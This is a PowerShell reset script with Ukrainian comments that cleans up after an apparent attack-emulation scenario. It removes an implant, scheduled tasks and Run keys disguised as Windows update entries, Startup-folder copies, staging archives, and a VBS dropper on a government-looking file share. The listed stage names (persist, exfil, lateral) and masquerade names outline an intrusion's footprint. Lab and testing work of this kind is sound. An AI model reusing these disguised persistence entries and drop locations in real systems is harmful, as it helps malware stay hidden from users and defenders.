# =============================================================================
# reset.ps1 — Очищення всіх артефактів сценарію
# Запускати перед повторним тестуванням або після рестору снапшоту
# =============================================================================

param(
    [switch]$KeepPersistence  # якщо вказано — не видаляє ScheduledTask і RunKey
)

$ErrorActionPreference = "SilentlyContinue"
$LOG_DIR     = "C:\ProgramData\upd_logs"
$PERSIST_DIR = "$env:APPDATA\Microsoft\WinUpd"

Write-Host "`n=== RESET: очищення артефактів ===" -ForegroundColor Cyan

# ── Видаляємо всю папку upd_logs цілком ──────────────────────────────────────

if (Test-Path $LOG_DIR) {
    try {
        [System.IO.Directory]::Delete($LOG_DIR, $true)
        Write-Host "  Deleted: $LOG_DIR" -ForegroundColor DarkGray
    } catch {
        Write-Host "  Fallback delete: $LOG_DIR" -ForegroundColor Yellow
        cmd /c "rmdir /s /q `"$LOG_DIR`""
    }
} else {
    Write-Host "  Not found: $LOG_DIR" -ForegroundColor DarkGray
}

# ── ZIP архіви з block4 ───────────────────────────────────────────────────────

Get-ChildItem "C:\ProgramData\WinUpd_*.zip" -ErrorAction SilentlyContinue | ForEach-Object {
    Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
    Write-Host "  Deleted: $($_.FullName)" -ForegroundColor DarkGray
}

# ── Persistent копія скриптів ─────────────────────────────────────────────────

if (Test-Path $PERSIST_DIR) {
    try {
        [System.IO.Directory]::Delete($PERSIST_DIR, $true)
        Write-Host "  Deleted: $PERSIST_DIR" -ForegroundColor DarkGray
    } catch {
        cmd /c "rmdir /s /q `"$PERSIST_DIR`""
        Write-Host "  Deleted (fallback): $PERSIST_DIR" -ForegroundColor DarkGray
    }
}

# ── Startup папка (block6 копіює сюди на цільовій машині) ────────────────────

$startup_allusers = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
$startup_user     = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"

$startup_files = @(
    "implant.ps1",
    "block1_persist.ps1","block2_discovery.ps1","block3_scan.ps1",
    "block4_staging.ps1","block5_exfil.ps1","block6_lateral.ps1",
    "block7_fileserver.ps1","config.ps1","WinSecUpdate.bat"
)

foreach ($startup in @($startup_allusers, $startup_user)) {
    $startup_files | ForEach-Object {
        $f = Join-Path $startup $_
        if (Test-Path $f) {
            # All-Users Startup потребує elevation — пробуємо takeown якщо звичайний del не спрацює
            cmd /c "del /f /q `"$f`"" 2>$null
            if (Test-Path $f) {
                cmd /c "takeown /f `"$f`" /a >nul 2>&1 && icacls `"$f`" /grant administrators:F >nul 2>&1 && del /f /q `"$f`"" 2>$null
            }
            if (-not (Test-Path $f)) {
                Write-Host "  Deleted from Startup: $_" -ForegroundColor DarkGray
            } else {
                Write-Host "  ACCESS DENIED (запусти reset.ps1 від імені адміністратора): $f" -ForegroundColor Red
            }
        }
    }
}

# ── block1 persistence artifacts ─────────────────────────────────────────────

if (-not $KeepPersistence) {

    # Scheduled Tasks
    @("WindowsUpdateCheck", "WinUpdateSvc") | ForEach-Object {
        $task = Get-ScheduledTask -TaskName $_ -ErrorAction SilentlyContinue
        if ($task) {
            Unregister-ScheduledTask -TaskName $_ -Confirm:$false
            Write-Host "  Deleted ScheduledTask: $_" -ForegroundColor DarkGray
        }
    }

    # Registry Run keys (HKCU + HKLM)
    $reg_hkcu = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $reg_hklm = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    @("SecurityHealthUpdater", "WinUpdateSvc", "WinSecUpdate") | ForEach-Object {
        foreach ($reg in @($reg_hkcu, $reg_hklm)) {
            if (Get-ItemProperty $reg -Name $_ -ErrorAction SilentlyContinue) {
                Remove-ItemProperty $reg -Name $_ -Force -ErrorAction SilentlyContinue
                Write-Host "  Deleted RunKey [$($reg -replace '.*\\Run','')]: $_" -ForegroundColor DarkGray
            }
        }
    }

    # WindowsUpdate.ps1 (стара persistent копія block1)
    $old = "$env:APPDATA\Microsoft\WindowsUpdate.ps1"
    if (Test-Path $old) {
        Remove-Item $old -Force
        Write-Host "  Deleted: $old" -ForegroundColor DarkGray
    }
}

# ── WS-2: скрипти в Windows\Temp + wsu.lock ──────────────────────────────────

Remove-Item "C:\Windows\Temp\*.ps1"   -Force -ErrorAction SilentlyContinue
Remove-Item "C:\Windows\Temp\wsu.lock" -Force -ErrorAction SilentlyContinue
Write-Host "  Cleaned: C:\Windows\Temp scripts + wsu.lock" -ForegroundColor DarkGray

# ── Implant temp файли ────────────────────────────────────────────────────────

Remove-Item "$env:TEMP\implant.rar"      -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\implant_drop.rar" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\implant_drop"     -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\wupd"             -Recurse -Force -ErrorAction SilentlyContinue
Write-Host "  Cleaned: implant temp files" -ForegroundColor DarkGray

# ── File share артефакти (тільки якщо шара доступна) ─────────────────────────

$share = "\\FILES.gov.local\public_folder"
if (Test-Path $share) {
    Remove-Item "$share\.winsec"                   -Force -ErrorAction SilentlyContinue
    Remove-Item "$share\WindowsSecurityUpdate.vbs" -Force -ErrorAction SilentlyContinue
    Write-Host "  Cleaned: file share artifacts" -ForegroundColor DarkGray
}

# ── Підсумок ──────────────────────────────────────────────────────────────────

Write-Host "`nГотово. Тепер можна запускати block1 знову." -ForegroundColor Green
Write-Host "Залишилось у upd_logs:" -ForegroundColor Cyan
if (Test-Path $LOG_DIR) {
    Get-ChildItem $LOG_DIR -Force | Select-Object Name, Length, LastWriteTime | Format-Table -AutoSize
} else {
    Write-Host "  (порожньо)" -ForegroundColor DarkGray
}
